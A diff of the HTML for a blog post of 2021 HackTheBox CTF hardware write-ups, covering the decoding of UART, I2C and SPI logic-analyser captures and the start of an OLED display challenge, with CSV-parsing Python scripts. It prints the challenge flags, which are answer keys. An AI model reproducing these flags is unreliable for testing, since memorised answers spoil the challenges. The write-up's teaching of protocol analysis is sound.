@@ -1,509 +1,322 @@
-<!doctype html><html lang=en data-mode=dark>
-<head>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
-<meta name=description content="A collection of writeups for all the hardware challenges in HackTheBoxCTF 2021">
-<meta property="og:title" content="How HackTheBoxCTF Exposed The Marriage of Saleae And Hardware">
-<meta property="og:description" content="A collection of writeups for all the hardware challenges in HackTheBoxCTF 2021">
-<meta property="og:url" content="https://anniequus.com/posts/htb-hardware-writeups/">
-<meta name=twitter:card content="summary_large_image">
-<title>How HackTheBoxCTF Exposed The Marriage of Saleae And Hardware</title>
-<link rel=canonical href=https://anniequus.com/posts/htb-hardware-writeups/>
-<link rel=preload href=https://anniequus.com/fonts/AnonymousPro-Regular.ttf as=font crossorigin=anonymous>
-<link rel=preload href=https://anniequus.com/fonts/Heebo-VariableFont_wght.ttf as=font crossorigin=anonymous>
-<link rel=preload href=https://anniequus.com/fonts/Rubik-VariableFont_wght.ttf as=font crossorigin=anonymous>
-<link rel=stylesheet href=https://anniequus.com/css/main.min.eeede07a5a7900394b8a57e5f48e56f7d17c1e2c8f672373eee3fb1ae0234398.css integrity="sha256-7u3gelp5ADlLilfl9I5W99F8HiyPZyNz7uP7GuAjQ5g=" crossorigin=anonymous>
-<script defer src=https://anniequus.com/js/main.min.a96afa085ea5710e329be0978d4a82bfb73b360d4492b02bc2fd1eaf26542e23.js integrity="sha256-qWr6CF6lcQ4ym+CXjUqCv7c7Ng1EkrArwv0eryZULiM=" crossorigin=anonymous></script>
-<script defer data-domain=anniequus.com src=https://plausible.io/js/plausible.js></script>
-</head>
-<body>
-<header id=navbar>
-<h1><a href=https://anniequus.com/>Equus 🐴 (Annie)</a></h1>
-<ul>
-<li><a href=/about/>About</a></li>
-<li><a href=/posts/>Posts</a></li>
-</ul>
-</header>
-<a href=# id=backtotop></a>
-<div class=content>
-<main>
-<article>
-<header>
-<h1>How HackTheBoxCTF Exposed The Marriage of Saleae And Hardware</h1>
-<section class=terms><a class=btn href=/categories/ctf/>CTF</a></section>
-<p>
-Published on <time datetime=2021-04-26>2021-04-26</time>
-</p>
-</header>
-<details class=toc open>
-<summary class=outline-dashed>
-Table of Contents
-</summary>
-<nav id=TableOfContents>
-<ul>
-<li><a href=#the-basics>The Basics</a>
-<ul>
-<li><a href=#serial-logs>Serial Logs</a></li>
-<li><a href=#compromised>Compromised</a></li>
-<li><a href=#secure>Secure</a></li>
-</ul>
-</li>
-<li><a href=#the-next-steps>The Next Steps</a>
-<ul>
-<li><a href=#off-the-grid>Off The Grid</a></li>
-<li><a href=#hidden>Hidden</a></li>
-<li><a href=#discovery>Discovery</a></li>
-</ul>
-</li>
-<li><a href=#extras>Extras</a>
-<ul>
-<li><a href=#theres-an-imposter-among-us>There&rsquo;s an imposter among us</a></li>
-<li><a href=#python-3-ified-exploit-script-to-bypass-authentication>Python 3-ified exploit script to bypass authentication</a></li>
-</ul>
-</li>
-</ul>
-</nav>
-</details>
-<p>This will be a writeup of all the hardware challenges in HackTheBoxCTF 2021. Although half the challenges in the category was just figuring out the protocol used, there were some interesting lessons learned.</p>
-<h2 id=the-basics>The Basics</h2>
-<p>The first three challenges (which I&rsquo;ll just call the basics) were best for getting used to using Saleae, its analysers, and getting a basic understanding of the protocols. This is where the heavy reliance on Saleae (logic analyser alpha) begins.</p>
-<h3 id=serial-logs>Serial Logs</h3>
-<img src=media/SerialLogsDescription.png alt="Challenge info for Serial Logs" loading=lazy>
-<a href=https://github.com/TheEquus/HackTheBoxCTF2021-Hardware-Files/raw/main/hw_serial_logs.zip target=_blank rel=noreferrer>Download the challenge</a>
-<p>We start off with a simple capture. Two channels, one is always high, and the other has both high and low signals. Based solely on the challenge title, we have serial data coming in, and given that there is no clock, we know we&rsquo;re dealing with asynchronous serial data. Now because we don&rsquo;t have a clock, we need to find the bitrate, which tells us to sample x bits every second.</p>
-<p>So, the proper way to do this would be to measure the smallest time between a rise and fall of a signal, then calculate the bit rate using that. But the issue was that I wasn&rsquo;t aware of that at the time, and I just blindly guessed bitrates initially (well, blindly with the help of a <a href=https://www.engineersgarage.com/raspberrypi/raspberry-pi-serial-communication-uart-protocol-ttl-port-usb-serial-boards/ target=_blank rel=noreferrer>guide</a>
+<!doctype html><html lang=en data-mode=dark><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=description content="A collection of writeups for all the hardware challenges in HackTheBoxCTF 2021"><meta property="og:title" content="How HackTheBoxCTF Exposed The Marriage of Saleae And Hardware"><meta property="og:description" content="A collection of writeups for all the hardware challenges in HackTheBoxCTF 2021"><meta property="og:url" content="https://anniequus.com/posts/htb-hardware-writeups/"><meta name=twitter:card content="summary_large_image"><title>How HackTheBoxCTF Exposed The Marriage of Saleae And Hardware</title><link rel=canonical href=https://anniequus.com/posts/htb-hardware-writeups/><link rel=preload href=https://anniequus.com/fonts/AnonymousPro-Regular.ttf as=font crossorigin=anonymous><link rel=preload href=https://anniequus.com/fonts/Heebo-VariableFont_wght.ttf as=font crossorigin=anonymous><link rel=preload href=https://anniequus.com/fonts/Rubik-VariableFont_wght.ttf as=font crossorigin=anonymous><link rel=stylesheet href=https://anniequus.com/css/main.min.eeede07a5a7900394b8a57e5f48e56f7d17c1e2c8f672373eee3fb1ae0234398.css integrity="sha256-7u3gelp5ADlLilfl9I5W99F8HiyPZyNz7uP7GuAjQ5g=" crossorigin=anonymous><script defer src=https://anniequus.com/js/main.min.cf29f7226a9c2b2d20303d20e6fdd133796cbbd092dfd7486f2e01b089ffe03d.js integrity="sha256-zyn3ImqcKy0gMD0g5v3RM3lsu9CS39dIby4BsIn/4D0=" crossorigin=anonymous></script>
+<script defer data-domain=anniequus.com src=https://plausible.io/js/plausible.js></script></head><body><header id=navbar><h1><a href=https://anniequus.com/>Equus 🐴 (Annie)</a></h1><ul><li><a href=/about/>About</a></li><li><a href=/posts/>Posts</a></li></ul></header><a href=# id=backtotop></a><div class=content><main><article><header><h1>How HackTheBoxCTF Exposed The Marriage of Saleae And Hardware</h1><section class=terms><a class=btn href=/categories/ctf/>CTF</a></section><p>Published on <time datetime=2021-04-26>2021-04-26</time></p></header><details class=toc open><summary class=outline-dashed>Table of Contents</summary><nav id=TableOfContents><ul><li><a href=#the-basics>The Basics</a><ul><li><a href=#serial-logs>Serial Logs</a></li><li><a href=#compromised>Compromised</a></li><li><a href=#secure>Secure</a></li></ul></li><li><a href=#the-next-steps>The Next Steps</a><ul><li><a href=#off-the-grid>Off The Grid</a></li><li><a href=#hidden>Hidden</a></li><li><a href=#discovery>Discovery</a></li></ul></li><li><a href=#extras>Extras</a><ul><li><a href=#theres-an-imposter-among-us>There&rsquo;s an imposter among us</a></li><li><a href=#python-3-ified-exploit-script-to-bypass-authentication>Python 3-ified exploit script to bypass authentication</a></li></ul></li></ul></nav></details><p>This will be a writeup of all the hardware challenges in HackTheBoxCTF 2021. Although half the challenges in the category was just figuring out the protocol used, there were some interesting lessons learned.</p><h2 id=the-basics>The Basics</h2><p>The first three challenges (which I&rsquo;ll just call the basics) were best for getting used to using Saleae, its analysers, and getting a basic understanding of the protocols. This is where the heavy reliance on Saleae (logic analyser alpha) begins.</p><h3 id=serial-logs>Serial Logs</h3><img src=media/SerialLogsDescription.png alt="Challenge info for Serial Logs" loading=lazy>
+<a href=https://github.com/TheEquus/HackTheBoxCTF2021-Hardware-Files/raw/main/hw_serial_logs.zip target=_blank rel=noreferrer>Download the challenge</a><p>We start off with a simple capture. Two channels, one is always high, and the other has both high and low signals. Based solely on the challenge title, we have serial data coming in, and given that there is no clock, we know we&rsquo;re dealing with asynchronous serial data. Now because we don&rsquo;t have a clock, we need to find the bitrate, which tells us to sample x bits every second.</p><p>So, the proper way to do this would be to measure the smallest time between a rise and fall of a signal, then calculate the bit rate using that. But the issue was that I wasn&rsquo;t aware of that at the time, and I just blindly guessed bitrates initially (well, blindly with the help of a <a href=https://www.engineersgarage.com/raspberrypi/raspberry-pi-serial-communication-uart-protocol-ttl-port-usb-serial-boards/ target=_blank rel=noreferrer>guide</a>
 ). But after cycling through those guesses, we get some promising data with bitrate = 115200.
-<img src=media/SerialLogsPromising.png alt="Serial Settings" loading=lazy>
-</p>
-<p>Upon exporting the results (and running a quick script to collect just the data we want), we can see that there&rsquo;s a whole bunch of &ldquo;Connection From&rdquo; repeated, until we hit an error.
-<img src=media/SerialLogsError.png alt="Serial looks promising until it doesn't" loading=lazy>
-</p>
-<p>The gibberish must be because of a baud rate change (change of bitrate). So looks like we&rsquo;ll have to calculate the bitrate of the second half. Given that the first half had a bitrate of 115200, and the smallest gap between the rise and fall of a signal is roughly 8.5us, we can approximate the bitrate by doing: 1/0.0000085s (8.5us = 0.0000085s), or more generally 1/gap.<br>
-So with this we can simply measure the smallest gap in the second half of the capture (~13.5us), throw that into the formula, and get an approximate bitrate (~74000 bits/s). Although it may not be the exact bitrate used, it was accurate enough to work in this case.
-Exporting the resulting data, and using a simple script to grab all the data:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Python data-lang=Python><span style=color:#f92672>import</span> csv
-
-output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
-<span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;secondbaud.csv&#34;</span>) <span style=color:#66d9ef>as</span> csv_file:
-    csv_reader <span style=color:#f92672>=</span> csv<span style=color:#f92672>.</span>reader(csv_file, delimiter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;,&#39;</span>)
-    <span style=color:#66d9ef>for</span> row <span style=color:#f92672>in</span> csv_reader:
-        output <span style=color:#f92672>+=</span> row[<span style=color:#ae81ff>1</span>]
-
-print(output)
-</code></pre></div><p>we can get the flag that we need!
-<code>CHTB{wh47?!_f23qu3ncy_h0pp1n9_1n_4_532141_p2070c01?!!!52}</code></p>
-<h3 id=compromised>Compromised</h3>
-<img src=media/CompromisedDescription.png alt="Challenge info for compromised" loading=lazy>
-<a href=https://github.com/TheEquus/HackTheBoxCTF2021-Hardware-Files/raw/main/hw_compromised.zip target=_blank rel=noreferrer>Download the challenge</a>
-<p>Here we see the challenge description talk about serial and slaves, and not the illegal kind. Masters and slaves in the context of chips is a reference to I2C, which is essentially a type of communication specially designed for two chips to talk with each other.</p>
-<p>Knowing this, we can skip some of the information on how I2C works, and load Saleae&rsquo;s handy I2C analyser and see what outputs we get. All we need to notice is that one of the channels has distinctly clock like features, so we can set that as our SCL. Leaving our other channel as the SDA.</p>
-<p>
-<img src=media/CompromisedOutData.png alt="Output data featuring hex" loading=lazy>
-Looking at our output, we see that a lot of data is being written to 0x34, but some of them are being written to 0x2C. That seems quite suspicious, so let&rsquo;s use a python script to take a look at what&rsquo;s happening there. (Note that the format is in: Time - ID - Address - Data - Read/Write - ACK/NAK)</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> csv
-
-output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
-<span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;idk.txt&#34;</span>) <span style=color:#66d9ef>as</span> csv_file:
-    csv_reader <span style=color:#f92672>=</span> csv<span style=color:#f92672>.</span>reader(csv_file, delimiter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;,&#39;</span>)
-    <span style=color:#66d9ef>for</span> row <span style=color:#f92672>in</span> csv_reader:
-        <span style=color:#75715e># adds data to output if it&#39;s being written to 0x2c</span>
-        <span style=color:#66d9ef>if</span> row[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;0x2C&#39;</span>:
-            output <span style=color:#f92672>+=</span> row[<span style=color:#ae81ff>3</span>][<span style=color:#ae81ff>2</span>:]
-<span style=color:#75715e># data I had was in hex, so needed to decode it to ascii</span>
-byte_array <span style=color:#f92672>=</span> bytearray<span style=color:#f92672>.</span>fromhex(output)
-print(byte_array<span style=color:#f92672>.</span>decode())
-</code></pre></div><p>Running the script, we get the flag!
-<code>CHTB{nu11_732m1n47025_c4n_8234k_4_532141_5y573m!@52)#@%}</code></p>
-<h3 id=secure>Secure</h3>
-<img src=media/SecureDescription.png alt="Challenge info for Secure" loading=lazy>
-<a href=https://github.com/TheEquus/HackTheBoxCTF2021-Hardware-Files/raw/main/hw_secure.zip target=_blank rel=noreferrer>Download the challenge</a>
-<p>Based on the challenge description mentioning microSD cards, we can guess that the SPI protocol is being used (as both <a href=https://en.wikipedia.org/wiki/SD_card#Transfer_modes target=_blank rel=noreferrer>SD and microSD cards use it</a>
-).</p>
-<p>Upon opening the capture, we see 4 channels. Channels 0 and 1 seem to be our data in, and Channel 3 is very clearly a clock. Meaning Channel 2 is the enable line, telling us when to sample the data from Channel 0 and 1. Since we have 2 channels that seem to be giving us data, we&rsquo;ll export all that info (as hex bytes), and run it through a simple python script.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> csv
-
-output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
-<span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;prayers.txt&#34;</span>) <span style=color:#66d9ef>as</span> csv_file:
-    csv_reader <span style=color:#f92672>=</span> csv<span style=color:#f92672>.</span>reader(csv_file, delimiter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;,&#39;</span>)
-    next(csv_reader)
-    <span style=color:#66d9ef>for</span> row <span style=color:#f92672>in</span> csv_reader:
-        <span style=color:#75715e># ignore the massive bunches of 0x00 and 0xFF in Channels 0 and 1</span>
-        <span style=color:#66d9ef>if</span> row[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;0xFF&#34;</span> <span style=color:#f92672>and</span> row[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;0x00&#34;</span>:
-            output <span style=color:#f92672>+=</span> row[<span style=color:#ae81ff>2</span>][<span style=color:#ae81ff>2</span>:]
-        <span style=color:#66d9ef>if</span> row[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;0xFF&#39;</span> <span style=color:#f92672>and</span> row[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;0x00&#34;</span>:
-            output <span style=color:#f92672>+=</span> row[<span style=color:#ae81ff>3</span>][<span style=color:#ae81ff>2</span>:]
-byte_array <span style=color:#f92672>=</span> bytearray<span style=color:#f92672>.</span>fromhex(output)
-<span style=color:#75715e># extended characters in output, so must use extended ascii to decode</span>
-print(byte_array<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ISO-8859-1&#39;</span>))
-</code></pre></div><p>And just like that, we get our flag!
-<code>CHTB{5P1_15_c0mm0n_0n_m3m02y_d3v1c35_!@52}</code></p>
-<h2 id=the-next-steps>The Next Steps</h2>
-<p>The next three were building on using protocols, and included some extra concepts too.</p>
-<h3 id=off-the-grid>Off The Grid</h3>
-<img src=media/OffTheGridDescription.png alt="Challenge info for Off The Grid" loading=lazy>
-<a href=https://github.com/TheEquus/HackTheBoxCTF2021-Hardware-Files/raw/main/hw_off_the_grid.zip target=_blank rel=noreferrer>Download the challenge</a>
-<p>A super fun challenge, where the important things to do are read the datasheet, and debug your own code.</p>
-<p>First important thing to note is the schematic. This provides all the context needed to analyse the .sal capture given.</p>
-<p>
-<img src=media/OffTheGridSchematic.png alt="Provided schematic for challenge" loading=lazy>
-The full image can be found in the download file, but the most important things to note are: the model of OLED display and chip, the pins, and which channel they&rsquo;re connected to in the logic analyser.</p>
-<p>From the schematic, it states that the screen/chip combo used is the SH1306. Although there&rsquo;s a cheap OLED screen of the same model name on <a href=https://www.aliexpress.com/item/1923853678.html target=_blank rel=noreferrer>aliexpress</a>
+<img src=media/SerialLogsPromising.png alt="Serial Settings" loading=lazy></p><p>Upon exporting the results (and running a quick script to collect just the data we want), we can see that there&rsquo;s a whole bunch of &ldquo;Connection From&rdquo; repeated, until we hit an error.
+<img src=media/SerialLogsError.png alt="Serial looks promising until it doesn't" loading=lazy></p><p>The gibberish must be because of a baud rate change (change of bitrate). So looks like we&rsquo;ll have to calculate the bitrate of the second half. Given that the first half had a bitrate of 115200, and the smallest gap between the rise and fall of a signal is roughly 8.5us, we can approximate the bitrate by doing: 1/0.0000085s (8.5us = 0.0000085s), or more generally 1/gap.<br>So with this we can simply measure the smallest gap in the second half of the capture (~13.5us), throw that into the formula, and get an approximate bitrate (~74000 bits/s). Although it may not be the exact bitrate used, it was accurate enough to work in this case.
+Exporting the resulting data, and using a simple script to grab all the data:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Python data-lang=Python><span style=display:flex><span><span style=color:#f92672>import</span> csv
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;secondbaud.csv&#34;</span>) <span style=color:#66d9ef>as</span> csv_file:
+</span></span><span style=display:flex><span>    csv_reader <span style=color:#f92672>=</span> csv<span style=color:#f92672>.</span>reader(csv_file, delimiter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;,&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> row <span style=color:#f92672>in</span> csv_reader:
+</span></span><span style=display:flex><span>        output <span style=color:#f92672>+=</span> row[<span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(output)
+</span></span></code></pre></div><p>we can get the flag that we need!
+<code>CHTB{wh47?!_f23qu3ncy_h0pp1n9_1n_4_532141_p2070c01?!!!52}</code></p><h3 id=compromised>Compromised</h3><img src=media/CompromisedDescription.png alt="Challenge info for compromised" loading=lazy>
+<a href=https://github.com/TheEquus/HackTheBoxCTF2021-Hardware-Files/raw/main/hw_compromised.zip target=_blank rel=noreferrer>Download the challenge</a><p>Here we see the challenge description talk about serial and slaves, and not the illegal kind. Masters and slaves in the context of chips is a reference to I2C, which is essentially a type of communication specially designed for two chips to talk with each other.</p><p>Knowing this, we can skip some of the information on how I2C works, and load Saleae&rsquo;s handy I2C analyser and see what outputs we get. All we need to notice is that one of the channels has distinctly clock like features, so we can set that as our SCL. Leaving our other channel as the SDA.</p><p><img src=media/CompromisedOutData.png alt="Output data featuring hex" loading=lazy>
+Looking at our output, we see that a lot of data is being written to 0x34, but some of them are being written to 0x2C. That seems quite suspicious, so let&rsquo;s use a python script to take a look at what&rsquo;s happening there. (Note that the format is in: Time - ID - Address - Data - Read/Write - ACK/NAK)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> csv
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;idk.txt&#34;</span>) <span style=color:#66d9ef>as</span> csv_file:
+</span></span><span style=display:flex><span>    csv_reader <span style=color:#f92672>=</span> csv<span style=color:#f92672>.</span>reader(csv_file, delimiter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;,&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> row <span style=color:#f92672>in</span> csv_reader:
+</span></span><span style=display:flex><span>        <span style=color:#75715e># adds data to output if it&#39;s being written to 0x2c</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> row[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;0x2C&#39;</span>:
+</span></span><span style=display:flex><span>            output <span style=color:#f92672>+=</span> row[<span style=color:#ae81ff>3</span>][<span style=color:#ae81ff>2</span>:]
+</span></span><span style=display:flex><span><span style=color:#75715e># data I had was in hex, so needed to decode it to ascii</span>
+</span></span><span style=display:flex><span>byte_array <span style=color:#f92672>=</span> bytearray<span style=color:#f92672>.</span>fromhex(output)
+</span></span><span style=display:flex><span>print(byte_array<span style=color:#f92672>.</span>decode())
+</span></span></code></pre></div><p>Running the script, we get the flag!
+<code>CHTB{nu11_732m1n47025_c4n_8234k_4_532141_5y573m!@52)#@%}</code></p><h3 id=secure>Secure</h3><img src=media/SecureDescription.png alt="Challenge info for Secure" loading=lazy>
+<a href=https://github.com/TheEquus/HackTheBoxCTF2021-Hardware-Files/raw/main/hw_secure.zip target=_blank rel=noreferrer>Download the challenge</a><p>Based on the challenge description mentioning microSD cards, we can guess that the SPI protocol is being used (as both <a href=https://en.wikipedia.org/wiki/SD_card#Transfer_modes target=_blank rel=noreferrer>SD and microSD cards use it</a>
+).</p><p>Upon opening the capture, we see 4 channels. Channels 0 and 1 seem to be our data in, and Channel 3 is very clearly a clock. Meaning Channel 2 is the enable line, telling us when to sample the data from Channel 0 and 1. Since we have 2 channels that seem to be giving us data, we&rsquo;ll export all that info (as hex bytes), and run it through a simple python script.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> csv
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;prayers.txt&#34;</span>) <span style=color:#66d9ef>as</span> csv_file:
+</span></span><span style=display:flex><span>    csv_reader <span style=color:#f92672>=</span> csv<span style=color:#f92672>.</span>reader(csv_file, delimiter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;,&#39;</span>)
+</span></span><span style=display:flex><span>    next(csv_reader)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> row <span style=color:#f92672>in</span> csv_reader:
+</span></span><span style=display:flex><span>        <span style=color:#75715e># ignore the massive bunches of 0x00 and 0xFF in Channels 0 and 1</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> row[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;0xFF&#34;</span> <span style=color:#f92672>and</span> row[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;0x00&#34;</span>:
+</span></span><span style=display:flex><span>            output <span style=color:#f92672>+=</span> row[<span style=color:#ae81ff>2</span>][<span style=color:#ae81ff>2</span>:]
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> row[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;0xFF&#39;</span> <span style=color:#f92672>and</span> row[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;0x00&#34;</span>:
+</span></span><span style=display:flex><span>            output <span style=color:#f92672>+=</span> row[<span style=color:#ae81ff>3</span>][<span style=color:#ae81ff>2</span>:]
+</span></span><span style=display:flex><span>byte_array <span style=color:#f92672>=</span> bytearray<span style=color:#f92672>.</span>fromhex(output)
+</span></span><span style=display:flex><span><span style=color:#75715e># extended characters in output, so must use extended ascii to decode</span>
+</span></span><span style=display:flex><span>print(byte_array<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ISO-8859-1&#39;</span>))
+</span></span></code></pre></div><p>And just like that, we get our flag!
+<code>CHTB{5P1_15_c0mm0n_0n_m3m02y_d3v1c35_!@52}</code></p><h2 id=the-next-steps>The Next Steps</h2><p>The next three were building on using protocols, and included some extra concepts too.</p><h3 id=off-the-grid>Off The Grid</h3><img src=media/OffTheGridDescription.png alt="Challenge info for Off The Grid" loading=lazy>
+<a href=https://github.com/TheEquus/HackTheBoxCTF2021-Hardware-Files/raw/main/hw_off_the_grid.zip target=_blank rel=noreferrer>Download the challenge</a><p>A super fun challenge, where the important things to do are read the datasheet, and debug your own code.</p><p>First important thing to note is the schematic. This provides all the context needed to analyse the .sal capture given.</p><p><img src=media/OffTheGridSchematic.png alt="Provided schematic for challenge" loading=lazy>
+The full image can be found in the download file, but the most important things to note are: the model of OLED display and chip, the pins, and which channel they&rsquo;re connected to in the logic analyser.</p><p>From the schematic, it states that the screen/chip combo used is the SH1306. Although there&rsquo;s a cheap OLED screen of the same model name on <a href=https://www.aliexpress.com/item/1923853678.html target=_blank rel=noreferrer>aliexpress</a>
 , there isn&rsquo;t really a datasheet that explains anything about it. There is however, an OLED + chip with a very similar name, the SSD1306. And even better, it has a very handy <a href=https://cdn-shop.adafruit.com/datasheets/SSD1306.pdf target=_blank rel=noreferrer>datasheet</a>
-for us to take a look at. Comparing the pins of our schematic and that of the datasheet, they&rsquo;re similar enough for us to use.</p>
-<p>Taking a look at what each pin means and is actually doing, we get the following information:</p>
-<ul>
-<li>DIN: The actual data</li>
-<li>CLK: The clock</li>
-<li>CS: Chip select (active low)</li>
-<li>D/C: Data/Command, low = transfer DIN data to command register, high = write to GDDRAM (to be displayed)</li>
-<li>RES: Reset</li>
-</ul>
-<p>Great, since we know that data is being written to the display (GDDRAM) we could probably try to find a way to emulate the screen, but how can we do that? Let&rsquo;s keep reading the datasheet.</p>
-<p>
-<img src=media/OffTheGridMCUInterface.png alt="Datasheet about MCU interface - no not the Marvel Cinematic Universe" loading=lazy>
-Based on this bit of the datasheet, we can deduce that the data transfer that has been captured is using 4-wire SPI. We know this because we have SDIN, (S)CLK, CS, D/C and RES. The <code>Tie LOW</code> and <code>NC</code> just means we can ignore those pins/signals.</p>
-<p>Sweet, now that we know what protocol is being used, we just need to figure out how to deal with the data being sent to GDDRAM. For now, we can ignore the commands (when D/C is low), since there are a lot of them in the datasheet, and at this stage there is no easy way to decode each command.</p>
-<p>Casually reading the datasheet, we hit the jackpot, some info on how the GDDRAM actually works.
+for us to take a look at. Comparing the pins of our schematic and that of the datasheet, they&rsquo;re similar enough for us to use.</p><p>Taking a look at what each pin means and is actually doing, we get the following information:</p><ul><li>DIN: The actual data</li><li>CLK: The clock</li><li>CS: Chip select (active low)</li><li>D/C: Data/Command, low = transfer DIN data to command register, high = write to GDDRAM (to be displayed)</li><li>RES: Reset</li></ul><p>Great, since we know that data is being written to the display (GDDRAM) we could probably try to find a way to emulate the screen, but how can we do that? Let&rsquo;s keep reading the datasheet.</p><p><img src=media/OffTheGridMCUInterface.png alt="Datasheet about MCU interface - no not the Marvel Cinematic Universe" loading=lazy>
+Based on this bit of the datasheet, we can deduce that the data transfer that has been captured is using 4-wire SPI. We know this because we have SDIN, (S)CLK, CS, D/C and RES. The <code>Tie LOW</code> and <code>NC</code> just means we can ignore those pins/signals.</p><p>Sweet, now that we know what protocol is being used, we just need to figure out how to deal with the data being sent to GDDRAM. For now, we can ignore the commands (when D/C is low), since there are a lot of them in the datasheet, and at this stage there is no easy way to decode each command.</p><p>Casually reading the datasheet, we hit the jackpot, some info on how the GDDRAM actually works.
 <img src=media/OffTheGridGDDRAM.png alt="Datasheet showing how pages are aligned in GDDRAM" loading=lazy>
-<img src=media/OffTheGridGDDRAMEnlarge.png alt="Datasheet showing how each byte goes into each page in GDDRAM" loading=lazy>
-</p>
-<p>The key information we can take away here, is the fact that whatever is in GDDRAM is bitmapped. What this means is that a single bit represents a pixel on the screen. This means we won&rsquo;t need to do anything too fancy to display what is going on in the screen. A simple python script (and GIMP) is all we need.<br>
-But now we need to know how exactly the bits are arranged to get the bitmap that we want.</p>
-<p>First of all, the bits are read as groups of 8 (byte by byte). They are then arranged into a page as shown:
-<img src=media/OffTheGridByteByByte.png alt="Sketch of how each bit is read as bytes" loading=lazy>
-<br>
-Each page has 128 of these bytes, all along a row, from left to right:<br>
-<img src=media/OffTheGridPageLayout.png alt="Hand drawn version of how each byte fits into each page" loading=lazy>
+<img src=media/OffTheGridGDDRAMEnlarge.png alt="Datasheet showing how each byte goes into each page in GDDRAM" loading=lazy></p><p>The key information we can take away here, is the fact that whatever is in GDDRAM is bitmapped. What this means is that a single bit represents a pixel on the screen. This means we won&rsquo;t need to do anything too fancy to display what is going on in the screen. A simple python script (and GIMP) is all we need.<br>But now we need to know how exactly the bits are arranged to get the bitmap that we want.</p><p>First of all, the bits are read as groups of 8 (byte by byte). They are then arranged into a page as shown:
+<img src=media/OffTheGridByteByByte.png alt="Sketch of how each bit is read as bytes" loading=lazy><br>Each page has 128 of these bytes, all along a row, from left to right:<br><img src=media/OffTheGridPageLayout.png alt="Hand drawn version of how each byte fits into each page" loading=lazy>
 And each page is stacked on top of each other, which will then give us our final image:
 <img src=media/OffTheGridPageStack.png alt="Page stacking sketch" loading=lazy>
-Bearing in mind that the dimensions of the OLED screen are 128x64, meaning we will have 8 pages per screen.</p>
-<p>Now that we know how the OLED screen will work, it&rsquo;s time to extract the data from the Saleae capture, and get our flag.</p>
-<p>As we know that the transfer protocol used was SPI, we can simply let a Saleae analyser give the required bits for us. We set the MOSI (or MISO, makes no difference in this case) as the data we want to get (Channel 0), our good old clock (Channel 1), and the enable line (Channel 3) which tells us when to sample our DIN. We set the enable line to active high, since when Channel 3 (D/C) is high, that&rsquo;s when data is being written into GDDRAM.
